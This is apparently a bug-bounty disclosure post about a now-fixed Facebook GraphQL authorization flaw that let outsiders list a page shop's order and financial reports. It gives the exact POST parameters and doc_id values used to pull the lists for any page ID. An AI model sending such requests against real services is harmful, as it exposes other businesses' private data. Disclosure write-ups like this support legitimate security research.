---
id: 281
title: 'View orders and financial reports lists for any page shop.'
date: '2019-08-01T14:08:39+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=281'
categories:
    - Uncategorized
---

**Description**

This bug could have allowed an attacker with no role in a page to extract the list of financial and orders reports created by the admins of that page, this bug doesn’t allow to download the reports but it gets the file names , status of these reports and their ids which could be used later in other attacks to download them.

**Demonstration**

- Orders reports

Send a POST request to https://www.facebook.com/api/graphql/ with valid cookies and these parameters in the body as follow :

`variables={"after":null,"paymentInvoiceableFilter":{"allowed_states":["INITED","RISK_QUEUED"],"chargeback_states":null,"minimum_creation_time":null,"invoice_ids":null},"first":20,"pageID":"XXXXX"} <br></br>doc_id=2036256919799956```

Where XXXXX is the id of the targeted page. The response to this request should contain a list of Orders reports.

- Financial reports

Send a POST request to the same endpoint after changing:

`variables={"pageID":"XXXXX","orderType":"nmor_checkout_experiences"}<br></br>doc_id=2127400373991060`

This request should return a list of financial reports of the page shop which have been created by one of its admin.

**Impact**

The list of created financial and orders reports should be visible to only admins of a page because it may reveals the shop performance (dates in file and status of the creation of the report) and expose the ids of these reports which could used later in other attacks.

**Timeline**

Jan 10 , 2019— Report Sent  
Jan 21, 2019 — Acknowledged by Facebook  
Feb 8, 2019 — Fixed by Facebook  
Feb 12, 2019 — Bounty Awarded by Facebook